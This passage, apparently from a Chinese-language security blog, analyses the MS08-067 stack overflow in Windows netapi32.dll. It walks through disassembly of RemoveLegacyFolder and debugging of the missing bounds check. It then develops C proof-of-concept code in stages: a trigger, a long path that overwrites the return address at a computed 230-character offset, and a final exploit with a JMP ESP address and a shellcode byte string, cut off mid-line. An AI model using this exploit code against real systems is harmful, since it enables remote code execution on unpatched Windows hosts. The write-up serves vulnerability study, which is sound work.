class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA20A @@chk_dos_path_type:</span><br><span class="line">5FDDA20A lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA210 call CheckDosPathType</span><br><span class="line">5FDDA215 test eax, eax</span><br><span class="line">5FDDA217 jnz short @@chk_buf_of_len</span><br><span class="line">5FDDA219 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA21F push eax</span><br><span class="line">5FDDA220 call RemoveLegarcyFolder;溢出函数</span><br><span class="line">5FDDA225 test eax, eax</span><br><span class="line">5FDDA227 jz short @@err_invalid_name</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>3）溢出就发生在子函数 RemoveLegacyFolder 中； RemoveLegacyFolder 返回后，如果返回非零，表示合并路径已符合要求，若其长度未超过 maxbuf，即可复制至 can_path 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA229 @@chk_buf_of_len:</span><br><span class="line">5FDDA229 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA22F push eax</span><br><span class="line">5FDDA230 call esi ; __imp_wcslen</span><br><span class="line">5FDDA232 lea eax, [eax+eax+2]</span><br><span class="line">5FDDA236 cmp eax, [ebp+arg_MaxBuf]</span><br><span class="line">5FDDA239 pop ecx</span><br><span class="line">5FDDA23A ja @@chk_retsize</span><br><span class="line">5FDDA240 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA246 push eax ; Source: Buff_OF</span><br><span class="line">5FDDA247 push [ebp+Outbuf] ; Dest: same as can_path</span><br><span class="line">5FDDA24D call ds:__imp_wcscpy</span><br><span class="line">5FDDA253 pop ecx</span><br><span class="line">5FDDA254 pop ecx</span><br><span class="line">5FDDA255 xor eax, eax</span><br><span class="line">5FDDA257 @@chk_security_cookie:</span><br><span class="line">5FDDA257 mov ecx, [ebp+security_cookie]</span><br><span class="line">5FDDA25A pop edi</span><br><span class="line">5FDDA25B pop esi</span><br><span class="line">5FDDA25C pop ebx</span><br><span class="line">5FDDA25D call chk_security_cookie</span><br><span class="line">5FDDA262 leave</span><br><span class="line">5FDDA263 retn 14h</span><br><span class="line">...</span><br><span class="line">5FDE88F9 @@chk_retsize:</span><br><span class="line">5FDE88F9 mov ecx, [ebp+RetSize]</span><br><span class="line">5FDE88FF test ecx, ecx</span><br><span class="line">5FDE8901 jz short @@err_buf_too_small</span><br><span class="line">5FDE8903 mov [ecx], eax</span><br><span class="line">5FDE8905 @@err_buf_too_small:</span><br><span class="line">5FDE8905 mov eax, NERR_BufTooSmall</span><br><span class="line">5FDE890A jmp @@chk_security_cookie</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="认识-legacy-folder"><a class="markdownIt-Anchor" href="#认识-legacy-folder"></a> 认识 Legacy Folder</h1><p>Legacy Folder，又叫经典目录，指的是 ’.‘ (当前目录) 和 ‘…’ (上一层目录)这两个特殊的目录。</p><p>在对路径进行范式化的过程中，函数 RemoveLegacyFolder 的作用就是将合并路径中的经典目录移去（后面简称“移经”），使路径达到最简洁状态。</p><h1 id="移经-测试"><a class="markdownIt-Anchor" href="#移经-测试"></a> “移经” 测试</h1><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719143626519.png" alt="image-20220719143626519" style="zoom:67%;"><p>通过黑盒测试，可以看出 RemoveLegacyFolder 函数具有以下特性：</p><p>1）通过 II、 III 对比，目录名是以‘\’作为隔离符的，如果‘…\’ 的左边没有隔离符了，“移经”将失败；<br>2）由 VIII 可以看出，在路径中部（注意，不是首部），如果有两个连续的隔离符‘\’，“移经”将失败；<br>3） XI 的返回值非零，但是合并路径中却有内容，表明“移经”操作应该通过并已经复制到 can_path 中，很可能是在最后的检查过程中，出现了错误。通过查看汇编代码，原来在路径合并结束后， NetpaPathCanonicalize 还会调用 NetpwPathType 函数对合并路径进行检查，并将 NetpwPathType 的结果作为整个函数的返回值。 XI 中的合并路径\\aaa 显然不是一个合法的路径</p><h1 id="移经-风险"><a class="markdownIt-Anchor" href="#移经-风险"></a> “移经” 风险</h1><p>‘ <code>.\</code>’ 的移去操作很简单：只需要调用一次字符复制函数即可将 “经典目录” 移去。<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719144447435.png" alt="image-20220719144447435" style="zoom: 50%;"></p><p>‘<code>..\</code>’ 的移去操作却麻烦了不少：</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719214318308.png" alt="image-20220719214318308"></p><p>如果 p1 为当前指针， p2 和 p1 总是相差 3 个字符的位置，但仅凭 p1、 p2 是无法获取 p3 ，因为 FOLDER2 的长度不固定，对于获取 p3 的位置，主要有两种解决方法：</p><ul><li><strong>事先定义变量记录每一个 \ 的位置</strong>；当复制结束后，当前指针 p1 的值更新为 p3， p3 的值更新为 p4；同 p3 一样， p4 也需要变量进行记录。</li><li><strong>如果不定义变量</strong>，则可以在“移经”后的路径中，从 p1 左侧开始，向左搜索首次出现的 ‘\’，即 p3；如果 p1 依然指向经典目录 ‘…\’，那么 p3 就是下一次 “移经” 复制的目的地址。</li></ul><p>RemoveLegacyFolder 函数采用的是不定义变量更新 p3，然而正是这个 “向左（前）搜索” 存在着 “风险”。</p><h2 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h2><p>函数调用链 <code>NetpwPathCanonicalize-&gt;CanonicalizePathName-&gt;RemoveLegacyFolder</code></p><h3 id="netpwpathcanonicalize"><a class="markdownIt-Anchor" href="#netpwpathcanonicalize"></a> NetpwPathCanonicalize</h3><p>**函数作用：**NetpwPathCanonicalize用于格式化网络路径字符串。</p><p>如果prefix串非空，将prefix串与path串用<code>\</code>相连，并复制输出到串<code>can_path</code>中，输出串的容量为maxbuf字节大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix + &#x27;\&#x27; + path =&gt; can_path [max_buf]</span><br></pre></td></tr></table></figure><p><strong>函数原型</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Int <span class="title function_">NetpwPathCanonicalize</span><span class="params">(</span></span><br><span class="line"><span class="params">    Uint16 path[ ],            <span class="comment">// [in]    path name</span></span></span><br><span class="line"><span class="params">    Uint8 can_path[ ],        <span class="comment">// [out]  canonicalized path</span></span></span><br><span class="line"><span class="params">    Uint32 maxbuf,            <span class="comment">// [in]     max size of can_path</span></span></span><br><span class="line"><span class="params">    Uint16 prefix[ ],        <span class="comment">// [in]     path prefix</span></span></span><br><span class="line"><span class="params">    Uint32* pathtype,        <span class="comment">// [int out] path type</span></span></span><br><span class="line"><span class="params">    Uint32 pathflags        <span class="comment">// [in]    path flags, 0 or 1</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>通过 NetpwPathCanonicalize 函数，找到 CanonicalizePathName 函数。<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719230053057.png" alt="image-20220719230053057"></p><p>在CanonicalizePathName 中找到 RemoveLegacyFolder 函数。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719221744326.png" alt="image-20220719221744326"></p><h2 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h2><p>在调用 RemoveLegacyFolder 时，RemoveLegacyFolder 的返回地址位于 0x12F6A4；待处理的合并路径，即 Buff_OF（ 0x12F6A8）指向的 unicode 串位于稍大的栈地址 0x12F6C0，是唯一的输入参数。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719222947145.png" alt="image-20220719222947145"></p><p>在移去经典目录‘ …\’后， RemoveLegacyFolder 函数会向左（前）即低地址空间搜索隔离字符‘ \’，如果前向搜索越过了待处理串的起始字符，即小于 0x12F6C0，搜索的结果将不可控，很可能远小于 ESP；当合并路径中再次出现经典目录‘ …\’并需要移去时，复制操作会将路径数据写入前面搜索到的栈地址，产生溢出，如果路径数据经过精心设计，很可能使某个函数的返回地址被覆盖修改，使溢出被成功利用。</p><p>总结，成功溢出的条件：<br>1）充分条件：前向搜索隔离符时，越过了 Buff_OF 指向的待处理串。<br>2）必要条件：合并路径中至少存在两个连续的经典目录‘…\’。<br>3）必要条件：合并路径中第二个‘…\’后有足够多的字符数以覆盖返回地址。</p><h1 id="poc-的构造"><a class="markdownIt-Anchor" href="#poc-的构造"></a> POC 的构造</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">        FreeLibrary(handle);</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbb&quot;</span>);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后运行结果：<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719223324355.png" alt="image-20220719223324355"></p><p>NetpwPathCanonicalize 函数正常返回，但是在输出的合并路径中，仍然存在一个经典目录 ‘ …\’，此时，我们可以结合静态分析，探究一下原因。以下是去除 ‘ …\’ 的相关汇编代码，变量 p1、 p2、p3 的定义请参看图 26.4.5。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA2BD @@period_found:</span><br><span class="line">5FDDA2BD lea eax, [esi-2] ; esi 为当前指针 p1，此时 p1 指向‘.’</span><br><span class="line">5FDDA2C0 cmp ebx, eax ; ebx 始终指向最新的‘\’，即 p2</span><br><span class="line">5FDDA2C2 jnz @@period_after_nonslash</span><br><span class="line">; 判断是否是经典目录：‘\.’或‘\..’</span><br><span class="line">5FDDA2C8 @@period_after_slash:</span><br><span class="line">5FDDA2C8 lea eax, [esi+2] ; eax 指向下一字符</span><br><span class="line">5FDDA2CB mov dx, [eax]</span><br><span class="line">5FDDA2CE cmp dx, &#x27;.&#x27; ; 是否‘\..’</span><br><span class="line">5FDDA2D2 jnz @@nonperiod_after_period</span><br><span class="line">5FDDA2D8 lea eax, [esi+4] ; eax 指向下两个字符</span><br><span class="line">5FDDA2DB mov bx, [eax]</span><br><span class="line">5FDDA2DE cmp bx, &#x27;\&#x27; ; 是否‘/../’</span><br><span class="line">5FDDA2E2 jz short @@skip_spps_by_copy</span><br><span class="line">5FDDA2E4 test bx, bx</span><br><span class="line">5FDDA2E7 jnz short @@move_forward</span><br><span class="line">5FDDA2E9 @@skip_spps_by_copy:</span><br><span class="line">5FDDA2E9 test edi, edi ; edi 指向 p2 之前的‘\’，即 p3</span><br><span class="line">5FDDA2EB jz @@exit_fail</span><br><span class="line">5FDDA2F1 push eax</span><br><span class="line">5FDDA2F2 push edi</span><br><span class="line">5FDDA2F3 call ds:__imp_wcscpy ; 移经操作： wcscpy(p3, p1)</span><br><span class="line">5FDDA2F9 test bx, bx</span><br><span class="line">5FDDA2FC pop ecx</span><br><span class="line">5FDDA2FD pop ecx</span><br><span class="line">5FDDA2FE jnz @@update_current_slash_after_copy</span><br><span class="line">…</span><br><span class="line">5FDE87F8 @@update_current_slash_after_copy:</span><br><span class="line">5FDE87F8 mov [ebp+current_slash], edi ; p2 &lt;= p3</span><br><span class="line">5FDE87FB mov esi, edi ; p1 &lt;= p3</span><br><span class="line">5FDE87FD lea eax, [edi-2] ; eax &lt;= p3-2，作为向前搜索‘/’</span><br><span class="line">                                ; 的初始指针，但是这里直接将指针</span><br><span class="line">                                ; 减 2，而没有做边界检查，这是导致</span><br><span class="line">                                ; 溢出的根本原因！</span><br><span class="line">5FDE8800 jmp short @@check_previous_slash_after_copy</span><br><span class="line">5FDE8802 @@loop_search_previous_slash:</span><br><span class="line">5FDE8802 cmp eax, [ebp+arg_Path] ; 这里的边界检查已无济于事，因为</span><br><span class="line">                                ; 在 0x5FDE87FD 处 eax 已经越界！</span><br><span class="line">                                ; 注： arg_Path 就是 Buff_OF</span><br><span class="line">5FDE8805 jz short @@previous_slash_found_after_copy</span><br><span class="line">5FDE8807 dec eax</span><br><span class="line">5FDE8808 dec eax</span><br><span class="line">5FDE8809 @@check_previous_slash_after_copy:</span><br><span class="line">5FDE8809 cmp word ptr [eax], &#x27;\&#x27;</span><br><span class="line">5FDE880D jnz short @@loop_search_previous_slash</span><br><span class="line">5FDE880F @@previous_slash_found_after_copy:</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到，位于 0x5FDDA2F3 处 wcscpy 函数运行后，完成了一次“移经”操作。接着代码 0x5FDE87F8 至 0x5FDE87FD 更新相关指针。位于 0x5FDE8800 至 0x5FDE880D 的循环代码用于向前搜索隔离字符指针 p3，<strong>尽管在循环过程中，代码有做边界检查，但是在循环初始化时却没有（见 0x5FDE87FD），而直接将指针初值 EDI 减 2</strong>；一旦初始化越界，循环过程中的边界检查将失效，因为指针 EAX 永远小于 Buff_OF 的起始字符地址，而循环退出的唯一条件是在低地址空间中再次找到隔离字符‘ \’。</p><p>调试到前向搜索越界时的状态。Buff_OF 位于 0x12F6C0，但是前向搜索的指针 EAX 已经被初始化为 0x12F6BE，小于 Buff_OF 了，我们不妨称这个指针为 previous_slash。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719231639738.png" alt="image-20220719231639738"></p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719232209182.png" alt="image-20220719232209182"></p><p>由于 previous_slash (=EAX) 远小于 ESP，当再次调用 wcscpy 进行字符复制时，如果复制通过精心设计， wcscpy 函数的栈帧和返回地址将被覆盖修改，也就是说当 wcscpy 退出时，溢出会被成功利用。</p><blockquote><p>提示：尽管微软在 Windows XP SP2 及之后的操作系统中引入了 security cookie 机制防止缓冲区溢出，但是 wcscpy 函数依然没有并没有采用该机制，因此 MS08-067 可以在多种操作系统上成功溢出。</p></blockquote><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220720080253266.png" alt="image-20220720080253266"></p><p>计算要覆盖到返回地址的字符长度，wcscpy 的返回地址位于 0x0012F684，prefix_slash 位于 0x0012F5A2 (EDI)。需要230个字符（0x0012F684 - 0x0012F5A2+0x4 = 0xe6）就能覆盖到返回地址了。</p><p>具备溢出功能的 POC 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">        FreeLibrary(handle);</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设计出最终的 exploit代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// address of jmp esp</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JMP_ESP  <span class="string">&quot;\x0b\xe9\xe0\x5f\x00\x00&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHELL_CODE \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x00\x00&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">FreeLibrary(handle);</span><br><span class="line">wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>);</span><br><span class="line">    wcscat(path, (<span 